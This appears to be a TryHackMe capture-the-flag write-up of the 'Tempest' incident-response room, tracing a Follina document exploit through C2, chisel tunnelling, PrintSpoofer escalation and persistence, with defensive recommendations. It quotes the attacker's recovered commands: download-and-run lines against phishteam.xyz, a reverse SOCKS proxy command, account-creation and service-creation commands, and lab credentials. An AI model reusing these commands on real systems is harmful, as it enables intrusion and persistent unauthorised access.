# TryHackMe — Tempest (Full Attack Chain: Sysmon, Windows Event Logs & PCAP)

**Category:** Defensive Security / Digital Forensics & Incident Response (DFIR)
**Data Sources:** `sysmon.evtx`, `windows.evtx`, `capture.pcapng`
**Skills demonstrated:** Sysmon-based process tree analysis, DNS/network correlation, malicious document (Follina/CVE-2022-30190) analysis, base64/PowerShell payload decoding, C2 traffic analysis in Wireshark/Brim, credential harvesting identification, SOCKS proxy tunneling detection, privilege-escalation technique attribution, persistence mechanism identification via Windows Security event IDs

---

## 1. Scenario

A SOC analyst escalated a CRITICAL-severity alert involving a workstation (`TEMPEST`) believed to be compromised via a malicious document. As the assigned Incident Responder, the objective was to reconstruct the **full attack chain** — from initial delivery through to full administrative persistence — using only the artifacts provided: a Sysmon event log, a Windows Security event log, and a full packet capture of the incident.

The investigation followed the natural progression of the intrusion: initial access, staged payload execution, command-and-control (C2) establishment, internal discovery, privilege escalation, and finally persistence — with each phase cross-referenced against at least two of the three available data sources wherever possible.

## 2. Objectives

1. Validate the integrity of all provided evidence via hashing.
2. Identify the initial access vector and the exploited vulnerability.
3. Reconstruct the multi-stage payload delivery chain.
4. Identify the C2 channel, its encoding, and its underlying tooling.
5. Identify credential harvesting and internal reconnaissance activity.
6. Identify the privilege-escalation technique and the tool used.
7. Identify all persistence mechanisms established after full compromise.

## 3. Evidence Integrity Verification

Before analysis began, the SHA256 hash of each artifact was computed to establish a documented chain of custody:

```powershell
cd .\Desktop\'Incident Files'
Get-FileHash capture.pcapng -Algorithm SHA256
Get-FileHash sysmon.evtx -Algorithm SHA256
Get-FileHash windows.evtx -Algorithm SHA256
```

| File | SHA256 |
|---|---|
| `capture.pcapng` | `CB3A1E6ACFB246F256FBFEFDB6F494941AA30A5A7C3F5258C3E63CFA27A23DC6` |
| `sysmon.evtx` | `665DC3519C2C235188201B5A8594FEA205C3BCBC75193363B87D2837ACA3C91F` |
| `windows.evtx` | `D0279D5292BC5B25595115032820C978838678F4333B725998CFE9253E186D60` |

## 4. Phase 1 — Initial Access: Malicious Document

The SOC had already established that a `.doc` file, downloaded via `chrome.exe`, was the intrusion's starting point. Analysis focused on Sysmon **Process Creation (Event ID 1)** and **DNS Query (Event ID 22)** events surrounding this file, tracing the process tree from `WINWORD.EXE` downward.

**Malicious document identified:** `free_magicules.doc`

**Compromised user and host:** `benimaru-TEMPEST`

**Word process PID that opened the document:** `496`

Filtering Event ID 22 for DNS queries occurring around this timeframe, and separately confirming the association by searching for the document filename across the full log, identified the domain resolved by the document's embedded exploit and its corresponding IP.

**Resolved IPv4 address:** `167.71.199.191`

Filtering Event ID 1 for a `ParentProcessID` of `496` revealed a follow-on process execution carrying a Base64-encoded PowerShell payload:

**Base64 payload:**
```
JGFwcD1bRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdBcHBsaWNhdGlvbkRhdGEnKTtjZCAiJGFwcFxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiOyBpd3IgaHR0cDovL3BoaXNodGVhbS54eXovMDJkY2YwNy91cGRhdGUuemlwIC1vdXRmaWxlIHVwZGF0ZS56aXA7IEV4cGFuZC1BcmNoaXZlIC5cdXBkYXRlLnppcCAtRGVzdGluYXRpb25QYXRoIC47IHJtIHVwZGF0ZS56aXA7Cg==
```

Given that this chain was ultimately executed through `msdt.exe` (the Microsoft Support Diagnostic Tool), external research into "msdt.exe Word document vulnerability" identified the specific exploit in use.

**CVE exploited:** `CVE-2022-30190` (publicly known as **Follina** — a Microsoft Support Diagnostic Tool remote code execution vulnerability triggerable via a specially crafted Office document, without requiring macros).

## 5. Phase 2 — Stage 2 Execution

Decoding the Base64 payload recovered in Phase 1 (via CyberChef) revealed the exact PowerShell command executed by the document:

```powershell
$app=[Environment]::GetFolderPath('ApplicationData');cd "$app\Microsoft\Windows\Start Menu\Programs\Startup"; iwr http://phishteam.xyz/02dcf07/update.zip -outfile update.zip; Expand-Archive .\update.zip -DestinationPath .; rm update.zip;
```

This command downloaded an archive and extracted its contents directly into the current user's **Startup folder** — a straightforward autostart persistence mechanism ensuring re-execution on every login.

**Full target path written:**
```
C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

Following the timeline forward, subsequent PowerShell executions with `explorer.exe` as their parent process (consistent with autostart execution at login) were identified:

**Command executed on successful login:**
```
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -noni certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe
```

This is a classic **LOLBIN download-and-execute** pattern: `certutil.exe`, a signed native Windows utility, was abused purely for its URL-fetch capability to retrieve and immediately run a second-stage binary, `first.exe`.

**SHA256 of `first.exe`:** `CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8`

Correlating Event ID 22 (DNS) around the execution of `first.exe`, then pivoting into the packet capture to confirm the destination, identified the C2 endpoint contacted by this stage.

**C2 domain and port:** `resolvecyber.xyz:80`

## 6. Phase 3 — Malicious Document Traffic & C2 Protocol Analysis

With both malicious domains now known (`phishteam.xyz` from initial delivery, `resolvecyber.xyz` from stage 2 C2), the packet capture was reviewed directly for the corresponding HTTP traffic.

**Payload URL embedded in the original document:**
```
http://phishteam.xyz/02dcf07/index.html
```

Filtering traffic to the `resolvecyber.xyz` C2 domain and inspecting the request/response bodies in CyberChef's Magic function identified the encoding scheme used for command-and-control communication.

**C2 encoding:** `base64`

**Parameter carrying command output back to the C2 server:** `q`

**URL used by the binary to retrieve commands to execute:** `/9ab62b5`

**HTTP method used:** `GET`

Reviewing the User-Agent string on this traffic revealed the compiler/runtime signature of the malware.

**Compiled with:** `nim`

This detail is notable: Nim-compiled malware has increasingly been used by threat actors specifically because it produces binaries with low antivirus detection rates relative to more common languages.

## 7. Phase 4 — Discovery: Internal Reconnaissance

Decoding the Base64-encoded C2 traffic (command/output pairs) surfaced the attacker's manual reconnaissance activity conducted through the implant. Among the recovered commands was a file read that disclosed hardcoded credentials:

```powershell
cat C:\Users\Benimaru\Desktop\automation.ps1
```
```powershell
$user = "TEMPEST\benimaru"
$pass = "infernotempest"
$securePassword = ConvertTo-SecureString $pass -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $user, $securePassword
```

**Password discovered:** `infernotempest`

This is a textbook example of **credentials in files** — an automation/scripting artifact left on disk containing plaintext domain credentials, discovered by an attacker already inside the host rather than through any external attack.

The attacker also enumerated listening ports via `netstat -ano -p tcp`, identifying a service suitable for remote access:

**Listening port used for remote shell access:** `5985` (Windows Remote Management / WinRM)

## 8. Phase 5 — C2 Tooling and Lateral Access Establishment

Continuing to trace network activity from the compromised host, the attacker was observed downloading and executing a SOCKS proxy tool:

```
powershell iwr http://phishteam.xyz/02dcf07/ch.exe -outfile C:\Users\benimaru\Downloads\ch.exe
```

**Reverse SOCKS proxy command executed:**
```
C:\Users\benimaru\Downloads\ch.exe client 167.71.199.191:8080 R:socks
```

**SHA256 of `ch.exe`:** `8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451`

A hash lookup against VirusTotal identified the binary.

**Tool identified:** `chisel` — a legitimate, open-source TCP/UDP tunneling utility frequently abused offensively to pivot through firewalled/NAT'd networks by establishing a reverse SOCKS proxy back to the attacker.

With the tunnel established, the attacker pivoted through it to reach internal services. Reviewing process/network activity by `benimaru` immediately following the proxy's establishment identified the authentication method used to gain interactive access.

**Service used to authenticate:** `WinRM`

## 9. Phase 6 — Privilege Escalation

With a low-privileged interactive shell established via the SOCKS-tunneled WinRM session, the attacker moved to escalate privileges. Correlating C2/proxy traffic with Wireshark against the known C2 domain revealed a second binary download.

**Privilege-escalation binary and hash:** `spf.exe`, `8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D`

A VirusTotal hash lookup identified the tool.

**Tool identified:** `PrintSpoofer` — a well-known Windows local privilege-escalation tool that abuses named-pipe impersonation to escalate from a service account with a specific dangerous privilege to `NT AUTHORITY\SYSTEM`.

**Privilege abused:** `SeImpersonatePrivilege` — this privilege (along with `SeAssignPrimaryTokenPrivilege`) allows a process to impersonate the security context of another user via APIs such as `CreateProcessWithToken()`, and is commonly present on service accounts by design, making it a frequent target for this class of attack.

After successful escalation, the attacker executed `PrintSpoofer` together with a second binary to re-establish a fresh, elevated C2 channel.

**Binary executed post-escalation:** `final.exe`

**C2 port used by this new connection (distinct from the initial C2 channel):** `8080`

## 10. Phase 7 — Actions on Objectives: Persistence as SYSTEM

With `NT AUTHORITY\SYSTEM`-level access established via `final.exe`, the attacker proceeded to entrench access through multiple, redundant persistence mechanisms — a hallmark of a deliberate, hands-on-keyboard intrusion rather than a purely automated one.

**Account creation:**
Searching Sysmon Event ID 1 for `user /add` revealed a failed creation attempt followed by successful account creation. The failed attempt was missing the `/add` switch itself — a minor operator error preceding the successful commands.

**Accounts created (alphabetical order):** `shion`, `shuna`

**Windows Security Event ID confirming account creation:** `4720`

**Command adding an account to the local Administrators group:**
```
net localgroup administrators /add shion
```

**Windows Security Event ID confirming addition to a sensitive local group:** `4732`

**Persistent administrative access via malicious service creation:**
Filtering Sysmon Event ID 1 for `final.exe` (the elevated C2 binary established during privilege escalation) revealed the attacker registering it as a Windows service — ensuring the C2 implant would survive reboots and run with SYSTEM privileges going forward:

```
C:\Windows\system32\sc.exe \\TEMPEST create TempestUpdate2 binpath= C:\ProgramData\final.exe start= auto
```

This single command represents the culmination of the intrusion: a disguised, auto-starting SYSTEM-level service permanently binding the C2 implant to the host.

## 11. Attack Chain Summary

```
Chrome download → free_magicules.doc (malicious .doc)
      │
      ▼
CVE-2022-30190 (Follina, via msdt.exe) → Base64 PowerShell payload
      │
      ▼
Payload dropped into user Startup folder (autostart persistence, stage 1)
      │
      ▼
On next login: certutil.exe (LOLBIN) → first.exe downloaded and run
      │
      ▼
first.exe → C2 established at resolvecyber.xyz:80 (Nim-compiled implant, base64-encoded traffic)
      │
      ▼
Internal recon via C2: automation.ps1 → plaintext credentials (infernotempest) harvested
      │
      ▼
netstat → WinRM (5985) identified as pivot target
      │
      ▼
ch.exe (chisel) → reverse SOCKS proxy to 167.71.199.191:8080
      │
      ▼
WinRM authentication through the SOCKS tunnel → interactive low-priv shell
      │
      ▼
spf.exe (PrintSpoofer) → SeImpersonatePrivilege abused → SYSTEM
      │
      ▼
final.exe executed → new elevated C2 channel on port 8080
      │
      ▼
Accounts "shion" and "shuna" created → shion added to local Administrators
      │
      ▼
sc.exe → "TempestUpdate2" service created (auto-start, binpath = final.exe) → persistent SYSTEM-level C2
```

## 12. MITRE ATT&CK Mapping

| Tactic | Technique ID | Technique Name | Evidence |
|---|---|---|---|
| Initial Access | [T1566.001](https://attack.mitre.org/techniques/T1566/001/) | Phishing: Spearphishing Attachment | `free_magicules.doc` downloaded and opened by the user |
| Execution | [T1218.007](https://attack.mitre.org/techniques/T1218/007/) | System Binary Proxy Execution: Msiexec *(closest category — MSDT abuse)* / [T1203](https://attack.mitre.org/techniques/T1203/) | Exploitation of `msdt.exe` via CVE-2022-30190 (Follina) |
| Execution | [T1059.001](https://attack.mitre.org/techniques/T1059/001/) | Command and Scripting Interpreter: PowerShell | Base64-encoded PowerShell payload executed by the document |
| Persistence | [T1547.001](https://attack.mitre.org/techniques/T1547/001/) | Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder | Payload written to the user's Startup folder |
| Execution / Defense Evasion | [T1105](https://attack.mitre.org/techniques/T1105/) | Ingress Tool Transfer | `certutil.exe` abused to download `first.exe` and `ch.exe` |
| Command and Control | [T1071.001](https://attack.mitre.org/techniques/T1071/001/) | Application Layer Protocol: Web Protocols | HTTP-based C2 via `resolvecyber.xyz` |
| Command and Control | [T1132.001](https://attack.mitre.org/techniques/T1132/001/) | Data Encoding: Standard Encoding | Base64-encoded C2 request/response traffic |
| Credential Access | [T1552.001](https://attack.mitre.org/techniques/T1552/001/) | Unsecured Credentials: Credentials In Files | Plaintext credentials harvested from `automation.ps1` |
| Discovery | [T1049](https://attack.mitre.org/techniques/T1049/) | System Network Connections Discovery | `netstat -ano -p tcp` enumeration |
| Command and Control | [T1090.001](https://attack.mitre.org/techniques/T1090/001/) | Proxy: Internal Proxy | `chisel` reverse SOCKS proxy tunnel |
| Lateral Movement | [T1021.006](https://attack.mitre.org/techniques/T1021/006/) | Remote Services: Windows Remote Management | WinRM authentication through the SOCKS tunnel |
| Privilege Escalation | [T1068](https://attack.mitre.org/techniques/T1068/) | Exploitation for Privilege Escalation | `PrintSpoofer` abusing `SeImpersonatePrivilege` to reach SYSTEM |
| Persistence | [T1136.001](https://attack.mitre.org/techniques/T1136/001/) | Create Account: Local Account | Accounts `shion` and `shuna` created |
| Privilege Escalation / Persistence | [T1098.007](https://attack.mitre.org/techniques/T1098/007/) / [T1078.003](https://attack.mitre.org/techniques/T1078/003/) | Account Manipulation / Valid Accounts: Local Accounts | `shion` added to the local Administrators group |
| Persistence | [T1543.003](https://attack.mitre.org/techniques/T1543/003/) | Create or Modify System Process: Windows Service | `sc.exe create TempestUpdate2` binding `final.exe` as an auto-start SYSTEM service |

## 13. Key Takeaways

- **A single unpatched client-side vulnerability opened the entire chain.** CVE-2022-30190 (Follina) required no macros and minimal user interaction, making the initial compromise nearly frictionless once the document was opened — reinforcing the value of patching MSDT-related vulnerabilities and disabling the protocol handler where feasible.
- **LOLBIN abuse remained a constant thread throughout the intrusion.** `certutil.exe` for payload delivery is a low-noise, high-reliability technique precisely because it is a trusted, signed system utility — application allow-listing and command-line-argument monitoring are far more effective controls here than binary blocklisting.
- **Legitimate open-source tools made excellent offensive infrastructure.** Both `chisel` (tunneling) and the eventual privilege-escalation binary were publicly available, well-documented tools — no custom malware development was required for the network-pivoting or privilege-escalation stages.
- **Redundant persistence is a sign of a deliberate, patient adversary.** Creating two new local accounts, elevating one to Administrators, and separately registering a disguised auto-start SYSTEM service all point to an attacker ensuring multiple independent paths back into the host, not merely a single foothold.
- **Cross-referencing Sysmon, Windows Security logs, and packet capture was essential at every stage.** No single data source told the complete story — DNS queries confirmed domains, process creation events confirmed execution and parentage, Windows Security event IDs (4720, 4732) confirmed account and group changes with authoritative timestamps, and packet capture confirmed what was actually transmitted over the wire.

## 14. Recommendations

| Area | Recommendation |
|---|---|
| Patch management | Apply the fix/mitigation for CVE-2022-30190 (Follina) and monitor for MSDT (`msdt.exe`) invocation from Office processes |
| Email/document security | Block or sandbox incoming `.doc`/legacy Office formats from external sources where feasible; enable Protected View by default |
| LOLBIN monitoring | Alert on `certutil.exe -urlcache`/`-split -f` usage and similar download-capable invocations of trusted system binaries |
| Credential hygiene | Remove hardcoded/plaintext credentials from automation scripts; use a credential vault or managed identity instead |
| Network egress controls | Restrict outbound connections to unknown domains/IPs, and alert on SOCKS-proxy-like traffic patterns (e.g., `chisel` signatures) |
| Privilege hardening | Audit and restrict `SeImpersonatePrivilege` grants on service accounts; deploy detections for known `PrintSpoofer`-style token-impersonation techniques |
| Account/group monitoring | Alert in real time on Windows Security Event IDs 4720 (account creation) and 4732 (sensitive group membership changes), especially outside change-management windows |
| Service creation monitoring | Alert on new service creation (`sc.exe create`) referencing binaries in non-standard paths such as `C:\ProgramData\` |

## 15. Conclusion

This investigation reconstructed a complete, multi-stage intrusion — from a single malicious document exploiting a known Microsoft vulnerability, through staged payload delivery, credential harvesting, network pivoting via a legitimate tunneling tool, privilege escalation via a well-documented Windows exploitation technique, and finally redundant, SYSTEM-level persistence. At no point did the attacker rely on custom or novel tooling; every stage used a publicly available technique or tool, underscoring that effective detection and response depend on strong baseline monitoring (process creation, DNS, account/group changes, service creation) rather than signature-based detection of "exotic" malware alone.

## 16. Methodology Note

The overall investigative approach and findings in this write-up were adapted from a publicly shared methodology for this room; the steps were independently reproduced and verified against the provided evidence set. The structure, explanations, and analysis above were written independently rather than following that source's narrative style or format.
